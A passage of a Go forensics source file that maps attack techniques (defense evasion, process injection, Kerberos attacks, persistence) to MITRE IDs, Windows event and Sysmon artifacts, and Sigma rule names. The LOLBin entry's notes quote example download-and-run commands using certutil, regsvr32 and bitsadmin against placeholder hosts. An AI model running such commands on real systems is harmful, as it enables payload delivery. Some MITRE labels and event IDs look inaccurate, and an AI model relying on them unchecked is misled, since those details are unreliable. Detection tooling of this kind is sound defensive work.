package forensics

import (
	"sort"
	"strings"
)

type KillChainPhase string

const (
	PhaseReconnaissance     KillChainPhase = "reconnaissance"
	PhaseInitialAccess      KillChainPhase = "initial_access"
	PhaseExecution          KillChainPhase = "execution"
	PhasePersistence        KillChainPhase = "persistence"
	PhasePrivilegeEscalation KillChainPhase = "privilege_escalation"
	PhaseDefenseEvasion     KillChainPhase = "defense_evasion"
	PhaseCredentialAccess   KillChainPhase = "credential_access"
	PhaseDiscovery          KillChainPhase = "discovery"
	PhaseLateralMovement    KillChainPhase = "lateral_movement"
	PhaseCollection         KillChainPhase = "collection"
	PhaseCommandAndControl  KillChainPhase = "command_and_control"
	PhaseExfiltration       KillChainPhase = "exfiltration"
	PhaseImpact             KillChainPhase = "impact"
)

type ArtifactCategory string

const (
	ArtifactWindowsEventLog ArtifactCategory = "windows_event_log"
	ArtifactSysmon          ArtifactCategory = "sysmon"
	ArtifactWindowsRegistry ArtifactCategory = "registry"
	ArtifactFileSystem      ArtifactCategory = "file_system"
	ArtifactNetwork         ArtifactCategory = "network"
	ArtifactMemory          ArtifactCategory = "memory"
	ArtifactPrefetch        ArtifactCategory = "prefetch"
	ArtifactAmcache         ArtifactCategory = "amcache"
	ArtifactShimcache       ArtifactCategory = "shimcache"
	ArtifactJumplist        ArtifactCategory = "jumplist"
	ArtifactSRUM            ArtifactCategory = "srum"
	ArtifactMFT             ArtifactCategory = "mft"
	ArtifactUSNJournal      ArtifactCategory = "usn_journal"
)

type ArtifactIndicator struct {
	Category    ArtifactCategory `json:"category"`
	Description string           `json:"description"`
	Location    string           `json:"location"`
	Severity    string           `json:"severity"`
	Notes       string           `json:"notes"`
	SigmaRule   string           `json:"sigma_rule,omitempty"`
}

type TechniqueArtifact struct {
	TechniqueID    string             `json:"technique_id"`
	TechniqueName  string             `json:"technique_name"`
	Package        string             `json:"package"`
	Phase          KillChainPhase     `json:"phase"`
	MITREID        string             `json:"mitre_id"`
	MITRETechnique string             `json:"mitre_technique"`
	Artifacts      []ArtifactIndicator `json:"artifacts"`
	DetectionEase  string             `json:"detection_ease"`
}

type ArtifactRegistry struct {
	techniques map[string]TechniqueArtifact
}

func NewArtifactRegistry() *ArtifactRegistry {
	return &ArtifactRegistry{techniques: initRegistry()}
}

func (r *ArtifactRegistry) GetByPhase(phase KillChainPhase) []TechniqueArtifact {
	var result []TechniqueArtifact
	for _, t := range r.techniques {
		if t.Phase == phase {
			result = append(result, t)
		}
	}
	sort.Slice(result, func(i, j int) bool {
		return result[i].TechniqueID < result[j].TechniqueID
	})
	return result
}

func (r *ArtifactRegistry) GetByTechniqueID(id string) (TechniqueArtifact, bool) {
	t, ok := r.techniques[id]
	return t, ok
}

func (r *ArtifactRegistry) GetByMITREID(id string) []TechniqueArtifact {
	var result []TechniqueArtifact
	for _, t := range r.techniques {
		if strings.EqualFold(t.MITREID, id) || strings.HasPrefix(t.MITREID, id) {
			result = append(result, t)
		}
	}
	return result
}

func (r *ArtifactRegistry) Search(query string) []TechniqueArtifact {
	q := strings.ToLower(query)
	var result []TechniqueArtifact
	for _, t := range r.techniques {
		if strings.Contains(strings.ToLower(t.TechniqueID), q) ||
			strings.Contains(strings.ToLower(t.TechniqueName), q) ||
			strings.Contains(strings.ToLower(t.MITREID), q) ||
			strings.Contains(strings.ToLower(t.MITRETechnique), q) ||
			strings.Contains(strings.ToLower(t.Package), q) {
			result = append(result, t)
		}
	}
	return result
}

func (r *ArtifactRegistry) GetAll() []TechniqueArtifact {
	var result []TechniqueArtifact
	for _, t := range r.techniques {
		result = append(result, t)
	}
	sort.Slice(result, func(i, j int) bool {
		return result[i].TechniqueID < result[j].TechniqueID
	})
	return result
}

func (r *ArtifactRegistry) GetEventLogArtifacts(phase KillChainPhase) []ArtifactIndicator {
	var result []ArtifactIndicator
	for _, t := range r.techniques {
		if t.Phase == phase || phase == "" {
			for _, a := range t.Artifacts {
				if a.Category == ArtifactWindowsEventLog || a.Category == ArtifactSysmon {
					result = append(result, a)
				}
			}
		}
	}
	return result
}

func (r *ArtifactRegistry) GetSigmaRules(techniqueID string) []string {
	var rules []string
	t, ok := r.techniques[techniqueID]
	if !ok {
		return rules
	}
	for _, a := range t.Artifacts {
		if a.SigmaRule != "" {
			rules = append(rules, a.SigmaRule)
		}
	}
	return rules
}

func initRegistry() map[string]TechniqueArtifact {
	m := make(map[string]TechniqueArtifact)

	m["E1"] = TechniqueArtifact{
		TechniqueID:    "E1",
		TechniqueName:  "AMSI Patching",
		Package:        "evasion",
		Phase:          PhaseDefenseEvasion,
		MITREID:        "T1562.001",
		MITRETechnique: "Impair Defenses: Disable or Modify Tools",
		DetectionEase:  "moderate",
		Artifacts: []ArtifactIndicator{
			{Category: ArtifactWindowsEventLog, Description: "AMSI initialization event", Location: "Event ID 1105 (Microsoft-Windows-AMSI/Operational)", Severity: "high", Notes: "Absence of 1105 may indicate patching", SigmaRule: "sysmon_amsi_patch"},
			{Category: ArtifactWindowsEventLog, Description: "PowerShell process start from office/scripting", Location: "Event ID 4688 (Security)", Severity: "medium", Notes: "Look for powershell.exe launched by WinWord, Excel, or wscript"},
			{Category: ArtifactSysmon, Description: "Process creation of suspicious PowerShell", Location: "Sysmon Event ID 1", Severity: "high", Notes: "Correlate with parent PID"},
			{Category: ArtifactWindowsEventLog, Description: "PowerShell script block logging", Location: "Event ID 4104 (Microsoft-Windows-PowerShell/Operational)", Severity: "high", Notes: "Look for suspicious AMSI bypass strings in ScriptBlockText", SigmaRule: "powershell_amsi_bypass"},
			{Category: ArtifactWindowsRegistry, Description: "AMSI provider registry key", Location: "HKLM\\Software\\Microsoft\\AMSI\\Providers", Severity: "medium", Notes: "Check for removed or modified provider GUIDs"},
		},
	}

	m["E2"] = TechniqueArtifact{
		TechniqueID:    "E2",
		TechniqueName:  "ETW Patching",
		Package:        "evasion",
		Phase:          PhaseDefenseEvasion,
		MITREID:        "T1562.006",
		MITRETechnique: "Impair Defenses: Disable or Modify ETW",
		DetectionEase:  "hard",
		Artifacts: []ArtifactIndicator{
			{Category: ArtifactWindowsEventLog, Description: "Missing or reduced ETW event volume", Location: "Event ID 1100-1105 gap (Microsoft-Windows-ETW/Operational)", Severity: "critical", Notes: "Gap in event sequence indicates ETW provider tampering"},
			{Category: ArtifactSysmon, Description: "ETW service state change", Location: "Sysmon Event ID 4 (Service State Change)", Severity: "high", Notes: "Check if ETW service was stopped or restarted"},
			{Category: ArtifactMemory, Description: "EtwEventWrite patched in memory", Location: "ntdll!EtwEventWrite function hook", Severity: "critical", Notes: "Detectable via Volatility apihooks plugin"},
		},
	}

	m["E3"] = TechniqueArtifact{
		TechniqueID:    "E3",
		TechniqueName:  "EDR Unhooking",
		Package:        "evasion",
		Phase:          PhaseDefenseEvasion,
		MITREID:        "T1562.001",
		MITRETechnique: "Impair Defenses: Disable or Modify Tools",
		DetectionEase:  "moderate",
		Artifacts: []ArtifactIndicator{
			{Category: ArtifactSysmon, Description: "Image loaded from temp directory", Location: "Sysmon Event ID 7 (Image Loaded)", Severity: "high", Notes: "ntdll.dll or kernel32.dll loaded from unusual path", SigmaRule: "sysmon_susp_image_load"},
			{Category: ArtifactSysmon, Description: "Suspicious LoadLibrary call", Location: "Sysmon Event ID 7", Severity: "high", Notes: "DLL loaded from non-standard location"},
			{Category: ArtifactMemory, Description: "NtOpenProcess with special privileges", Location: "Syscall monitoring", Severity: "high", Notes: "Detectable via Volatility devicetree or callbacks"},
		},
	}

	m["E4"] = TechniqueArtifact{
		TechniqueID:    "E4",
		TechniqueName:  "Sandbox Detection",
		Package:        "evasion",
		Phase:          PhaseDefenseEvasion,
		MITREID:        "T1497.003",
		MITRETechnique: "Virtualization/Sandbox Evasion: Time Based Evasion",
		DetectionEase:  "hard",
		Artifacts: []ArtifactIndicator{
			{Category: ArtifactWindowsEventLog, Description: "Extended sleep API calls", Location: "Event ID 4688 with Sleep/NtDelayExecution", Severity: "medium", Notes: "Process executing sleep() for >60 seconds"},
			{Category: ArtifactSysmon, Description: "Process with GetTickCount/QueryPerformanceCounter", Location: "Sysmon Event ID 1", Severity: "low", Notes: "Look for processes using kernel32.GetTickCount in call stack"},
			{Category: ArtifactMemory, Description: "Sleep skipping patch in ntdll", Location: "ntdll!NtDelayExecution hook", Severity: "medium", Notes: "Observable in sample runtime analysis"},
		},
	}

	m["E5"] = TechniqueArtifact{
		TechniqueID:    "E5",
		TechniqueName:  "LOLBin Abuse",
		Package:        "evasion",
		Phase:          PhaseDefenseEvasion,
		MITREID:        "T1218",
		MITRETechnique: "Signed Binary Proxy Execution",
		DetectionEase:  "moderate",
		Artifacts: []ArtifactIndicator{
			{Category: ArtifactSysmon, Description: "certutil used for download", Location: "Sysmon Event ID 1 (certutil.exe with -urlcache or -split)", Severity: "high", Notes: "certutil.exe -urlcache -f http://target payload.exe", SigmaRule: "sysmon_certutil_download"},
			{Category: ArtifactSysmon, Description: "mshta executed with remote URL", Location: "Sysmon Event ID 1 (mshta.exe http://)", Severity: "high", Notes: "Look for mshta.exe with http/https argument", SigmaRule: "sysmon_mshta_remote_url"},
			{Category: ArtifactSysmon, Description: "regsvr32 with scrobj.dll", Location: "Sysmon Event ID 1 (regsvr32.exe with .sct)", Severity: "high", Notes: "regsvr32.exe /s /u /i:http://… scrobj.dll", SigmaRule: "sysmon_regsvr32_squiblydoo"},
			{Category: ArtifactSysmon, Description: "rundll32 executing from suspicious path", Location: "Sysmon Event ID 1 (rundll32.exe with non-standard DLL)", Severity: "high", Notes: "Check command line for inline exports", SigmaRule: "sysmon_rundll32_ads"},
			{Category: ArtifactSysmon, Description: "bitsadmin download", Location: "Sysmon Event ID 1 (bitsadmin /transfer) or Event ID 3", Severity: "medium", Notes: "bitsadmin /transfer job http://target path", SigmaRule: "sysmon_bitsadmin_download"},
			{Category: ArtifactWindowsEventLog, Description: "WMIC process creation", Location: "Event ID 4688 (wmic.exe process call create)", Severity: "high", Notes: "wmic process call create rundll32.exe"},
			{Category: ArtifactWindowsEventLog, Description: "AppLocker rule block", Location: "Event ID 8020 (AppLocker)", Severity: "medium", Notes: "Indicates blocked LOLBin execution attempt"},
		},
	}

	m["E6"] = TechniqueArtifact{
		TechniqueID:    "E6",
		TechniqueName:  "Memory-Only Execution",
		Package:        "evasion",
		Phase:          PhaseDefenseEvasion,
		MITREID:        "T1055",
		MITRETechnique: "Process Injection",
		DetectionEase:  "hard",
		Artifacts: []ArtifactIndicator{
			{Category: ArtifactSysmon, Description: "CreateRemoteThread detected", Location: "Sysmon Event ID 8 (CreateRemoteThread)", Severity: "critical", Notes: "Hollowed process spawning threads without backing image", SigmaRule: "sysmon_createremotethread"},
			{Category: ArtifactSysmon, Description: "Process access from non-parent", Location: "Sysmon Event ID 10 (ProcessAccess)", Severity: "high", Notes: "Unusual cross-process handle with PROCESS_ALL_ACCESS"},
			{Category: ArtifactSysmon, Description: "Process hollowing detected", Location: "Sysmon Event ID 25 (Process Tampering)", Severity: "critical", Notes: "Indicates process image change after creation", SigmaRule: "sysmon_process_tampering"},
			{Category: ArtifactMemory, Description: "VAD region without mapped file", Location: "Volatility malfind / hollowfind output", Severity: "critical", Notes: "Private memory with PAGE_EXECUTE_READWRITE and no backing"},
		},
	}

	m["F1"] = TechniqueArtifact{
		TechniqueID:    "F1",
		TechniqueName:  "CreateRemoteThread Injection",
		Package:        "processinjection",
		Phase:          PhaseExecution,
		MITREID:        "T1055.001",
		MITRETechnique: "Process Injection: Dynamic-link Library Injection",
		DetectionEase:  "moderate",
		Artifacts: []ArtifactIndicator{
			{Category: ArtifactSysmon, Description: "CreateRemoteThread call detected", Location: "Sysmon Event ID 8", Severity: "critical", Notes: "Look for StartAddress pointing to unknown/unbacked memory", SigmaRule: "sysmon_createremotethread"},
			{Category: ArtifactSysmon, Description: "Cross-process handle opened", Location: "Sysmon Event ID 10 (ProcessAccess)", Severity: "high", Notes: "Handle with PROCESS_CREATE_THREAD | PROCESS_VM_WRITE"},
			{Category: ArtifactWindowsEventLog, Description: "Process creation with suspicious parent", Location: "Event ID 4688", Severity: "medium", Notes: "Target process has child from non-associated parent"},
			{Category: ArtifactMemory, Description: "Remote thread in target process", Location: "Volatility threads plugin", Severity: "high", Notes: "Thread with StartAddress in PAGE_EXECUTE_READWRITE region"},
		},
	}

	m["F2"] = TechniqueArtifact{
		TechniqueID:    "F2",
		TechniqueName:  "APC Injection",
		Package:        "processinjection",
		Phase:          PhaseExecution,
		MITREID:        "T1055.004",
		MITRETechnique: "Process Injection: Asynchronous Procedure Call",
		DetectionEase:  "hard",
		Artifacts: []ArtifactIndicator{
			{Category: ArtifactSysmon, Description: "QueueUserAPC to alertable thread", Location: "Sysmon Event ID 8 type QueueUserAPC", Severity: "critical", Notes: "APC routine queued to remote thread in alertable state", SigmaRule: "sysmon_apc_injection"},
			{Category: ArtifactSysmon, Description: "Process access for APC injection", Location: "Sysmon Event ID 10", Severity: "high", Notes: "Process opened with PROCESS_SET_INFORMATION"},
			{Category: ArtifactWindowsEventLog, Description: "Suspicious thread wake behavior", Location: "Event ID 4688 parent process anomaly", Severity: "medium", Notes: "Alertable wait calls (SleepEx, WaitForSingleObjectEx) precede injection"},
			{Category: ArtifactMemory, Description: "APC entries in kernel-mode APC queue", Location: "Volatility apc or apihooks plugin", Severity: "critical", Notes: "Kernel-mode APCs with unusual kernel routine addresses"},
		},
	}

	m["F3"] = TechniqueArtifact{
		TechniqueID:    "F3",
		TechniqueName:  "Thread Hijacking",
		Package:        "processinjection",
		Phase:          PhaseExecution,
		MITREID:        "T1055.003",
		MITRETechnique: "Process Injection: Thread Execution Hijacking",
		DetectionEase:  "moderate",
		Artifacts: []ArtifactIndicator{
			{Category: ArtifactSysmon, Description: "SuspendThread and SetThreadContext combination", Location: "Sysmon Event ID 10, Event ID 8", Severity: "high", Notes: "SuspendThread followed by SetThreadContext on same thread", SigmaRule: "sysmon_suspendthread_injection"},
			{Category: ArtifactSysmon, Description: "CreateRemoteThread to resume hijacked thread", Location: "Sysmon Event ID 8", Severity: "critical", Notes: "ResumeThread on thread that was previously suspended"},
			{Category: ArtifactWindowsEventLog, Description: "Thread context modification", Location: "Event ID 4688 with debug privilege", Severity: "medium", Notes: "SeDebugPrivilege enabled on process performing injection"},
		},
	}

	m["F4"] = TechniqueArtifact{
		TechniqueID:    "F4",
		TechniqueName:  "Process Hollowing",
		Package:        "processinjection",
		Phase:          PhaseExecution,
		MITREID:        "T1055.012",
		MITRETechnique: "Process Injection: Process Hollowing",
		DetectionEase:  "moderate",
		Artifacts: []ArtifactIndicator{
			{Category: ArtifactSysmon, Description: "NtUnmapViewOfSection call", Location: "Sysmon Event ID 8 (type NtUnmapViewOfSection)", Severity: "critical", Notes: "Section unmapping precedes code injection", SigmaRule: "sysmon_process_hollowing"},
			{Category: ArtifactWindowsEventLog, Description: "Suspended process creation", Location: "Event ID 4688 with CREATE_SUSPENDED flag", Severity: "high", Notes: "Process created in suspended state by explorer.exe or non-PE loader", SigmaRule: "win_suspicious_suspended_process"},
			{Category: ArtifactSysmon, Description: "Process tampering detected", Location: "Sysmon Event ID 25", Severity: "critical", Notes: "Process image differs from original executable on disk", SigmaRule: "sysmon_process_tampering"},
			{Category: ArtifactMemory, Description: "Hollowed process VAD", Location: "Volatility hollowfind / malfind", Severity: "critical", Notes: "PE header mismatch between disk and memory"},
		},
	}

	m["F5"] = TechniqueArtifact{
		TechniqueID:    "F5",
		TechniqueName:  "Reflective DLL Injection",
		Package:        "processinjection",
		Phase:          PhaseExecution,
		MITREID:        "T1055.001",
		MITRETechnique: "Process Injection: Dynamic-link Library Injection",
		DetectionEase:  "hard",
		Artifacts: []ArtifactIndicator{
			{Category: ArtifactSysmon, Description: "Image loaded from memory (no backing file)", Location: "Sysmon Event ID 7", Severity: "critical", Notes: "DLL module without a corresponding file on disk", SigmaRule: "sysmon_reflective_dll_load"},
			{Category: ArtifactSysmon, Description: "CreateRemoteThread with unknown start address", Location: "Sysmon Event ID 8", Severity: "high", Notes: "Thread start address in non-image memory region"},
			{Category: ArtifactMemory, Description: "DLL in memory without disk mapping", Location: "Volatility ldrmodules plugin", Severity: "critical", Notes: "DLL present in VAD but not on disk or in known module list"},
			{Category: ArtifactWindowsEventLog, Description: "Process loading unusual DLLs", Location: "Event ID 4688 for suspicious process", Severity: "medium", Notes: "Process started with modified import table"},
		},
	}

	m["K1"] = TechniqueArtifact{
		TechniqueID:    "K1",
		TechniqueName:  "Golden Ticket",
		Package:        "kerberos",
		Phase:          PhaseCredentialAccess,
		MITREID:        "T1558.001",
		MITRETechnique: "Steal or Forge Kerberos Tickets: Golden Ticket",
		DetectionEase:  "hard",
		Artifacts: []ArtifactIndicator{
			{Category: ArtifactWindowsEventLog, Description: "Anomalous SID in logon session", Location: "Event ID 4624 (Security) with anomalous SID history", Severity: "critical", Notes: "Enterprise admin SID on non-DC machine", SigmaRule: "win_golden_ticket_sid_anomaly"},
			{Category: ArtifactWindowsEventLog, Description: "Special logon with extended privileges", Location: "Event ID 4672 (Special Logon) with anomalous SIDs", Severity: "high", Notes: "SeTcbPrivilege or SeDebugPrivilege assigned to user without admin rights"},
			{Category: ArtifactNetwork, Description: "Kerberos TGS-REP without KDC interaction", Location: "Network traffic: Kerberos TGS-REP with no prior TGS-REQ", Severity: "critical", Notes: "TGS issued without KDC involvement — forged ticket"},
			{Category: ArtifactWindowsEventLog, Description: "Service ticket with anomalous encryption", Location: "Event ID 4769 with RC4 for service not configured for RC4", Severity: "high", Notes: "Golden tickets often use RC4 (0x17) regardless of service config"},
		},
	}

	m["K2"] = TechniqueArtifact{
		TechniqueID:    "K2",
		TechniqueName:  "Silver Ticket",
		Package:        "kerberos",
		Phase:          PhaseCredentialAccess,
		MITREID:        "T1558.002",
		MITRETechnique: "Steal or Forge Kerberos Tickets: Silver Ticket",
		DetectionEase:  "moderate",
		Artifacts: []ArtifactIndicator{
			{Category: ArtifactWindowsEventLog, Description: "TGS request for non-existent service account", Location: "Event ID 4769 (Kerberos Service Ticket Operations) with RC4 encryption", Severity: "critical", Notes: "Service account does not exist in AD", SigmaRule: "win_silver_ticket_nonexistent_service"},
			{Category: ArtifactWindowsEventLog, Description: "RC4-encrypted TGS for AES-only service", Location: "Event ID 4769 with TicketEncryptionType 0x17", Severity: "high", Notes: "Service configured for AES256 but RC4 ticket requested"},
			{Category: ArtifactWindowsEventLog, Description: "Anomalous service ticket access", Location: "Event ID 4769 with failure code 0x12 (STATUS_TRUSTED_RELATIONSHIP_FAILURE) after success", Severity: "high", Notes: "Multiple TGS requests for same service from different sources"},
			{Category: ArtifactNetwork, Description: "Forged TGS response", Location: "Network traffic: TGS-REP without corresponding TGS-REQ", Severity: "critical", Notes: "No preceding AS-REQ or TGS-REQ for the session"},
		},
	}

	m["K3"] = TechniqueArtifact{
		TechniqueID:    "K3",
		TechniqueName:  "Diamond Ticket",
		Package:        "kerberos",
		Phase:          PhaseCredentialAccess,
		MITREID:        "T1558",
		MITRETechnique: "Steal or Forge Kerberos Tickets",
		DetectionEase:  "hard",
		Artifacts: []ArtifactIndicator{
			{Category: ArtifactWindowsEventLog, Description: "Anomalous TGT signature", Location: "Event ID 4768 (TGT Requested) with modified PAC", Severity: "critical", Notes: "TGT decrypted and re-encrypted with different session key", SigmaRule: "win_diamond_ticket_anomalous_tgt"},
			{Category: ArtifactWindowsEventLog, Description: "TGT renewal with inconsistent fields", Location: "Event ID 4770 (TGT Renewal)", Severity: "high", Notes: "Renewed TGT has different PAC than original"},
			{Category: ArtifactWindowsEventLog, Description: "Missing KDC interaction for TGT", Location: "Event ID 4768 not present but TGS tickets issued", Severity: "critical", Notes: "TGS-REQ for service without AS-REQ seen on network"},
			{Category: ArtifactNetwork, Description: "Decrypted and re-encrypted TGT on wire", Location: "Kerberos AS-REP with anomalous signature", Severity: "critical", Notes: "Requires KDC-side monitoring of TGT signature mismatch"},
		},
	}

	m["K4"] = TechniqueArtifact{
		TechniqueID:    "K4",
		TechniqueName:  "AS-REP Roasting",
		Package:        "kerberos",
		Phase:          PhaseCredentialAccess,
		MITREID:        "T1558.004",
		MITRETechnique: "Steal or Forge Kerberos Tickets: AS-REP Roasting",
		DetectionEase:  "easy",
		Artifacts: []ArtifactIndicator{
			{Category: ArtifactWindowsEventLog, Description: "AS-REP with pre-authentication flag off", Location: "Event ID 4768 (TGT Requested) with DoNotRequirePreAuth flag", Severity: "high", Notes: "User account has UF_DONT_REQUIRE_PREAUTH set", SigmaRule: "win_asrep_roasting_preauth_disabled"},
			{Category: ArtifactWindowsEventLog, Description: "Multiple AS-REP responses from same source", Location: "Event ID 4768 with ResultCode 0x0 from single IP", Severity: "high", Notes: "Brute force of AS-REP encrypted hash", SigmaRule: "win_multiple_asrep_responses"},
			{Category: ArtifactWindowsEventLog, Description: "RC4-encrypted AS-REP for pre-auth disabled user", Location: "Event ID 4768 with TicketEncryptionType 0x17", Severity: "high", Notes: "RC4 downgrade for users without pre-auth"},
		},
	}

	m["K5"] = TechniqueArtifact{
		TechniqueID:    "K5",
		TechniqueName:  "Kerberoasting",
		Package:        "kerberos",
		Phase:          PhaseCredentialAccess,
		MITREID:        "T1558.003",
		MITRETechnique: "Steal or Forge Kerberos Tickets: Kerberoasting",
		DetectionEase:  "easy",
		Artifacts: []ArtifactIndicator{
			{Category: ArtifactWindowsEventLog, Description: "TGS request with RC4 encryption", Location: "Event ID 4769 with TicketEncryptionType 0x17 (RC4)", Severity: "high", Notes: "Service requested with RC4 cipher for offline cracking", SigmaRule: "win_kerberoasting_rc4"},
			{Category: ArtifactWindowsEventLog, Description: "Many TGS requests from same source IP", Location: "Event ID 4769 multiple requests from one account within short window", Severity: "high", Notes: "Scripted service enumeration via SPN scanning", SigmaRule: "win_multiple_tgs_requests"},
			{Category: ArtifactWindowsEventLog, Description: "Service ticket request without corresponding service access", Location: "Event ID 4769 followed by no 4624 for target service", Severity: "medium", Notes: "TGS requested but ticket never used for logon"},
			{Category: ArtifactWindowsEventLog, Description: "Account lockout due to failed TGS decryption", Location: "Event ID 4771 (Kerberos Pre-Authentication Failed) or 4648", Severity: "low", Notes: "Offline cracking attempts may trigger lockout"},
		},
	}

	m["K6"] = TechniqueArtifact{
		TechniqueID:    "K6",
		TechniqueName:  "DCSync",
		Package:        "kerberos",
		Phase:          PhaseCredentialAccess,
		MITREID:        "T1003.006",
		MITRETechnique: "OS Credential Dumping: DCSync",
		DetectionEase:  "easy",
		Artifacts: []ArtifactIndicator{
			{Category: ArtifactWindowsEventLog, Description: "DS-Replication-Get-Changes access", Location: "Event ID 4662 (DS Operation) with GUID 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2", Severity: "critical", Notes: "Replication access by non-DC account", SigmaRule: "win_dcsync_replication"},
			{Category: ArtifactWindowsEventLog, Description: "Logon to Domain Controller from non-DC system", Location: "Event ID 4624 logon type 3 (Network) on DC", Severity: "high", Notes: "User authenticated to DC for replication from workstation"},
			{Category: ArtifactWindowsEventLog, Description: "Replication operation from unusual account", Location: "Event ID 4662 with access mask 0x100 (ControlAccess)", Severity: "high", Notes: "DRSGetNCChanges request from user without replication rights"},
			{Category: ArtifactNetwork, Description: "DRSGetNCChanges DCE/RPC call", Location: "Network traffic: DCE/RPC with uuid e3514235-4b06-11d1-ab04-00c04fc2dcd2", Severity: "critical", Notes: "Directory Replication Service RPC call to get-changes"},
		},
	}

	m["K7"] = TechniqueArtifact{
		TechniqueID:    "K7",
		TechniqueName:  "Overpass-the-Hash",
		Package:        "kerberos",
		Phase:          PhaseCredentialAccess,
		MITREID:        "T1550.003",
		MITRETechnique: "Use Alternate Authentication Material: Pass the Hash",
		DetectionEase:  "moderate",
		Artifacts: []ArtifactIndicator{
			{Category: ArtifactWindowsEventLog, Description: "Logon type 9 (NewCredentials) with Kerberos", Location: "Event ID 4624 LogonType 9", Severity: "high", Notes: "NewCredentials logon using NTLM hash converted to Kerberos ticket", SigmaRule: "win_overpass_the_hash_logon"},
			{Category: ArtifactWindowsEventLog, Description: "Anomalous logon session with dual credentials", Location: "Event ID 4624 with logon type 9 secondary logon", Severity: "high", Notes: "Process running under alternate credentials obtained from hash"},
			{Category: ArtifactWindowsEventLog, Description: "NTLM hash credential material in LSASS", Location: "Event ID 4663 (SAM/Domain) access", Severity: "medium", Notes: "LSASS handle for NTLM hash extraction prior to overpass"},
		},
	}

	m["K8"] = TechniqueArtifact{
		TechniqueID:    "K8",
		TechniqueName:  "Pass-the-Ticket",
		Package:        "kerberos",
		Phase:          PhaseCredentialAccess,
		MITREID:        "T1550.003",
		MITRETechnique: "Use Alternate Authentication Material: Pass the Hash",
		DetectionEase:  "hard",
		Artifacts: []ArtifactIndicator{
			{Category: ArtifactWindowsEventLog, Description: "Kerberos ticket replay via logon", Location: "Event ID 4624 with TGT authentication without AS-REQ", Severity: "critical", Notes: "Ticket presented without corresponding AS exchange", SigmaRule: "win_pass_the_ticket"},
			{Category: ArtifactWindowsEventLog, Description: "TGS from non-standard location", Location: "Event ID 4648 (Explicit Credential) or 4624 LogonType 11", Severity: "high", Notes: "Cached ticket used from different machine than original issuer"},
			{Category: ArtifactWindowsEventLog, Description: "Kerberos service ticket anomaly", Location: "Event ID 4769 with service ticket replay", Severity: "high", Notes: "Same TGS ticket presented multiple times from different sources"},
			{Category: ArtifactMemory, Description: "Kerberos ticket in LSASS dump", Location: "Volatility mimikatz plugin or hashdump", Severity: "critical", Notes: "TGT/TGS extracted from LSASS memory (detectable via krbtgt module)"},
		},
	}

	m["P1"] = TechniqueArtifact{
		TechniqueID:    "P1",
		TechniqueName:  "Registry Run Keys",
		Package:        "persistence",
		Phase:          PhasePersistence,
		MITREID:        "T1547.001",
		MITRETechnique: "Boot or Logon Autostart Execution: Registry Run Keys",
		DetectionEase:  "easy",
		Artifacts: []ArtifactIndicator{
			{Category: ArtifactWindowsEventLog, Description: "Registry modification to Run key", Location: "Event ID 4657 (Registry modification) on HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", Severity: "high", Notes: "New value added to Run key by non-admin tool", SigmaRule: "win_registry_run_key_modification"},
			{Category: ArtifactSysmon, Description: "Registry object added or modified", Location: "Sysmon Event ID 12 (RegistryEvent) or 13", Severity: "high", Notes: "Run key value created or modified", SigmaRule: "sysmon_registry_run_key"},
			{Category: ArtifactWindowsRegistry, Description: "Run key persistence entry", Location: "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run, HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", Severity: "high", Notes: "Check both HKLM and HKCU hives"},
			{Category: ArtifactWindowsRegistry, Description: "RunOnce key persistence entry", Location: "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", Severity: "high", Notes: "Often used for single-execution persistence"},
		},
	}

	m["P2"] = TechniqueArtifact{
		TechniqueID:    "P2",
		TechniqueName:  "Startup Folder",
		Package:        "persistence",
		Phase:          PhasePersistence,
		MITREID:        "T1547.001",
		MITRETechnique: "Boot or Logon Autostart Execution: Registry Run Keys",
		DetectionEase:  "easy",
		Artifacts: []ArtifactIndicator{
			{Category: ArtifactFileSystem, Description: "File created in Startup folder", Location: "C:\\Users\\<User>\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\", Severity: "high", Notes: "LNK or executable written to user startup", SigmaRule: "win_startup_folder_file_write"},
			{Category: ArtifactSysmon, Description: "File create in startup folder", Location: "Sysmon Event ID 11 (FileCreate)", Severity: "high", Notes: "New file in Startup directory with suspicious extension", SigmaRule: "sysmon_startup_folder"},
			{Category: ArtifactUSNJournal, Description: "USN Journal record of startup file creation", Location: "USN Journal $J entry for startup path", Severity: "medium", Notes: "Correlate with MFT entry for timeline"},
			{Category: ArtifactMFT, Description: "MFT entry for startup folder file", Location: "$MFT entry in Startup folder", Severity: "medium", Notes: "Check $STANDARD_INFORMATION vs $FILE_NAME timestamps"},
		},
	}

	m["P3"] = TechniqueArtifact{
		TechniqueID:    "P3",
		TechniqueName:  "AppInit_DLLs",
		Package:        "persistence",
		Phase:          PhasePersistence,
		MITREID:        "T1546.011",
		MITRETechnique: "Event Triggered Execution: AppInit DLLs",
		DetectionEase:  "moderate",
		Artifacts: []ArtifactIndicator{
			{Category: ArtifactWindowsEventLog, Description: "Registry modification to AppInit_DLLs", Location: "Event ID 4657 on HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\AppInit_DLLs", Severity: "high", Notes: "Value modification to AppInit_DLLs key", SigmaRule: "win_appinit_dlls_registry"},
			{Category: ArtifactSysmon, Description: "Registry event for AppInit_DLLs", Location: "Sysmon Event ID 13 (RegistryEvent Value Set)", Severity: "high", Notes: "AppInit_DLLs value created or modified"},
			{Category: ArtifactSysmon, Description: "DLL load from loaded via AppInit", Location: "Sysmon Event ID 7 (Image Loaded) for loadorder", Severity: "medium", Notes: "Correlate image loads with AppInit_DLLs value"},
			{Category: ArtifactWindowsRegistry, Description: "AppInit_DLLs registry value", Location: "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\AppInit_DLLs", Severity: "high", Notes: "LoadAppInit_DLLs must be 1 for persistence to work"},
		},
	}

	m["P4"] = TechniqueArtifact{
		TechniqueID:    "P4",
		TechniqueName:  "IFEO Persistence",
		Package:        "persistence",
		Phase:          PhasePersistence,
		MITREID:        "T1546.012",
		MITRETechnique: "Event Triggered Execution: Image File Execution Options",
		DetectionEase:  "moderate",
		Artifacts: []ArtifactIndicator{
